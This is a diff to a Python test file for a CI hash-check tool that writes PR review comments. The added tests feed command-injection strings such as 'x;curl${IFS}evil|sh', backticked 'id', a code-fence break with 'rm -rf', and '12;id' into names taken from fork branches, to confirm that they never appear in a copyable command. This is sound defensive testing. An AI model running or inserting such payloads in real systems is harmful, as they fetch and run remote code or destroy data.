@@ -15,6 +15,7 @@ regen_gate.py and impl_header.py.
 from __future__ import annotations
 
 import hashlib
+import os
 import shutil
 import subprocess
 import sys
@@ -498,12 +499,28 @@ class TestCli:
         assert "the review does not run" in summary
         assert "form=legacy stop=true cause=mismatch" in capsys.readouterr().out
         text = body.read_text(encoding="utf-8")
-        assert "The file holds one hash only." in text and "left from an older run" in text
+        assert "The file holds no code hash that this check can read." in text
+        assert "left from an older run or was changed afterwards" in text
         assert "The review did not run" in text and f"`{STOP_LABEL}`" in text
+
+    def test_a_damaged_code_line_is_not_called_a_one_line_file(self, tmp_path, monkeypatch):
+        """Two lines, the second not a code hash: the comment must not say the file holds one hash."""
+        self._check(tmp_path, monkeypatch, _python("pending"), _python("pending"))
+        hash_file = tmp_path / "render.sha256"
+        first = hash_file.read_text(encoding="utf-8").splitlines()[0]
+        hash_file.write_text(f"{first}\nnot-a-hash  code\n", encoding="utf-8")
+        (tmp_path / "head.py").write_bytes(_python("pending", body="x\n"))
+        (tmp_path / "output").unlink()
+        body = tmp_path / "comment.md"
+        check = ["check", "--hash", str(hash_file), "--source", str(tmp_path / "head.py"), "--language", "python"]
+        assert main([*check, "--head", HEAD, "--comment-out", str(body)]) == 0
+        assert _outputs((tmp_path / "output").read_text(encoding="utf-8"))["cause"] == "mismatch"
+        text = body.read_text(encoding="utf-8")
+        assert "holds no code hash that this check can read" in text and "one hash only" not in text
 
     # What each cause but a mismatch says: the finding, and where the PR goes.
     CAUSES = {
-        "missing": ("missing", "carry no `render.sha256`"),
+        "missing": ("missing", "Staging holds no `render.sha256` for this PR"),
         "content": ("unreadable", "render.sha256 holds no sha256"),
         "fetch": ("unreadable", "could not be downloaded after three attempts"),
     }
@@ -543,7 +560,11 @@ class TestCli:
         if retry:
             # The storage failed, the renders were not judged: a failed review, which the watchdog re-runs.
             assert f"labels the PR `{RETRY_LABEL}`" in text and "the watchdog starts the review again once" in text
-            assert STOP_LABEL not in text and "bulk-generate" not in text
+            # One rescue per PR, and none for a parked one: the comment must not promise more.
+            assert f"Unless the PR is already parked with `{STOP_LABEL}`" in text
+            assert "If it has already rescued this PR (`ai-review-rescued`)" in text
+            assert "gh workflow run impl-review.yml -f pr_number=<this PR's number>\n" in text
+            assert "bulk-generate" not in text
         else:
             assert f"labels this PR `{STOP_LABEL}` and ends as failed; the PR stays open" in text
             assert "gh workflow run bulk-generate.yml -f specification_id=scatter-basic -f library=matplotlib" in text
@@ -563,8 +584,55 @@ class TestCli:
         output, _, body = self._check(tmp_path, monkeypatch, None, _python("pending"))
         assert _outputs(output)["status"] == "missing"
         text = body.read_text(encoding="utf-8")
-        assert "nothing ties them to the implementation at `0123456`" in text
-        assert "fails its run when it cannot" in text and "not staged by this PR's own run" in text
+        assert "nothing ties its renders to the implementation at `0123456`" in text
+        # Every way staging ends up without a hash, this PR's own failed run included.
+        assert "did not finish (it failed or was cancelled before it wrote the hash)" in text
+        assert "left from an earlier run or were put there by hand, or nothing was staged at all" in text
+        assert "not staged by this PR's own run" not in text
+
+    @pytest.mark.parametrize(
+        ("spec_id", "library"),
+        [
+            ("x;curl${IFS}evil|sh", "matplotlib"),
+            ("scatter-basic", "matplotlib`id`"),
+            ("scatter-basic\n```\nrm -rf", "matplotlib"),
+            ("Scatter_Basic", "matplotlib"),
+            ("scatter-basic-", "matplotlib"),
+        ],
+        ids=["shell", "backticks", "fence-break", "not-a-slug", "trailing-dash"],
+    )
+    def test_the_command_takes_no_name_that_is_not_a_slug(self, tmp_path, monkeypatch, spec_id, library):
+        """Both names come from the PR's branch, which a fork chooses, and the reader copies the command."""
+        _, _, body = self._check(
+            tmp_path, monkeypatch, None, _python("pending"), "--spec-id", spec_id, "--library", library
+        )
+        text = body.read_text(encoding="utf-8")
+        assert "gh workflow run bulk-generate.yml -f specification_id=<spec-id> -f library=<library>\n" in text
+        assert spec_id not in text and library not in text
+        assert text.count("```") == 2
+
+    @pytest.mark.parametrize(
+        ("number", "written"),
+        [
+            ("13122", "13122"),
+            ("", "<this PR's number>"),
+            ("12;id", "<this PR's number>"),
+            ("１２", "<this PR's number>"),
+        ],
+        ids=["number", "absent", "shell", "not-ascii"],
+    )
+    def test_the_rerun_command_takes_digits_only(self, tmp_path, monkeypatch, number, written):
+        _, _, body = self._check(
+            tmp_path,
+            monkeypatch,
+            _python("pending"),
+            _python("pending"),
+            "--fetch-error=ServiceException: 503",
+            f"--pr-number={number}",
+        )
+        text = body.read_text(encoding="utf-8")
+        assert f"gh workflow run impl-review.yml -f pr_number={written}\n" in text
+        assert ";id" not in text
 
     def test_an_unreadable_head_stops_like_a_mismatch(self, tmp_path, monkeypatch):
         output, _, body = self._check(tmp_path, monkeypatch, _python("pending"), _python("pending"))
@@ -624,3 +692,78 @@ def test_javascript_without_impl_header_fails_and_writes_nothing(tmp_path):
     )
     assert result.returncode != 0
     assert not (tmp_path / "render.sha256").exists()
+
+
+WORKFLOW_COPIES = ("render_hash.py", "regen_gate.py", "impl_header.py")
+
+
+def _copy_run(tmp_path: Path, *args: str | bytes, lang: str = "C.UTF-8") -> subprocess.CompletedProcess[bytes]:
+    """Run the copied script the way a workflow step does: isolated, with its outputs in files."""
+    env = {
+        "PATH": os.environ["PATH"],
+        "LANG": lang,
+        "LC_ALL": lang,
+        "GITHUB_OUTPUT": str(tmp_path / "output"),
+        "GITHUB_STEP_SUMMARY": str(tmp_path / "summary"),
+    }
+    command: list[str | bytes] = [sys.executable, "-I", str(tmp_path / "render_hash.py"), *args]
+    return subprocess.run(command, cwd=tmp_path, env=env, capture_output=True)
+
+
+@pytest.mark.parametrize("language", sorted(PAIRS))
+def test_check_runs_as_the_workflow_ref_copy(tmp_path, language):
+    """`check` from the three files a workflow copies, and nothing else of the repository.
+
+    Every stop in impl-review and both fatal hash steps run this copy, so an
+    import the copy cannot resolve would pass every in-package test and fail
+    in production.
+    """
+    for module in WORKFLOW_COPIES:
+        shutil.copy(TOOLS / module, tmp_path / module)
+    generated, reviewed = PAIRS[language]
+    (tmp_path / "rendered").write_text(generated, encoding="utf-8")
+    (tmp_path / "head").write_text(reviewed, encoding="utf-8")
+    assert _copy_run(tmp_path, "write", "--source", "rendered", "--language", language, "--out", "h").returncode == 0
+    check = ["check", "--hash", "h", "--language", language, "--head", HEAD, "--comment-out", "body.md"]
+    names = ["--spec-id", "scatter-basic", "--library", "matplotlib", "--pr-number", "7"]
+
+    result = _copy_run(tmp_path, *check, "--source", "head", *names)
+    assert result.returncode == 0, result.stderr.decode(errors="replace")
+    assert (tmp_path / "output").read_text(encoding="utf-8") == MATCH_OUTPUT
+    assert b"via=code form=two-line" in result.stdout
+
+    (tmp_path / "output").unlink()
+    (tmp_path / "other").write_text(reviewed + "\nx = 2\n", encoding="utf-8")
+    result = _copy_run(tmp_path, *check, "--source", "other", *names)
+    assert result.returncode == 0, result.stderr.decode(errors="replace")
+    assert _outputs((tmp_path / "output").read_text(encoding="utf-8")) == {
+        "status": "mismatch",
+        "stop": "true",
+        "cause": "mismatch",
+        "retry": "false",
+        "code": KEEP_CODE,
+    }
+    text = (tmp_path / "body.md").read_text(encoding="utf-8")
+    assert "gh workflow run bulk-generate.yml -f specification_id=scatter-basic -f library=matplotlib" in text
+
+
+@pytest.mark.parametrize("lang", ["C.UTF-8", "C"])
+def test_a_fetch_error_cut_inside_a_character_still_stops(tmp_path, lang):
+    """impl-review cuts the download's error at 300 bytes, which can split a character.
+
+    The stray byte reaches the script as a surrogate. Written as it is, it
+    crashes the check before any output exists, and a crashed check lets the
+    review run.
+    """
+    for module in WORKFLOW_COPIES:
+        shutil.copy(TOOLS / module, tmp_path / module)
+    (tmp_path / "head").write_bytes(_python("pending"))
+    check = ["check", "--hash", "absent", "--source", "head", "--language", "python", "--head", HEAD]
+    result = _copy_run(
+        tmp_path, *check, "--comment-out", "body.md", b"--fetch-error=ServiceException: caf\xc3", lang=lang
+    )
+    assert result.returncode == 0, result.stderr.decode(errors="replace")
+    outputs = _outputs((tmp_path / "output").read_text(encoding="utf-8"))
+    assert (outputs["stop"], outputs["cause"], outputs["retry"]) == ("true", "fetch", "true")
+    assert b"::warning::render_hash status=unreadable" in result.stdout
+    assert "ServiceException: caf" in (tmp_path / "body.md").read_text(encoding="utf-8")
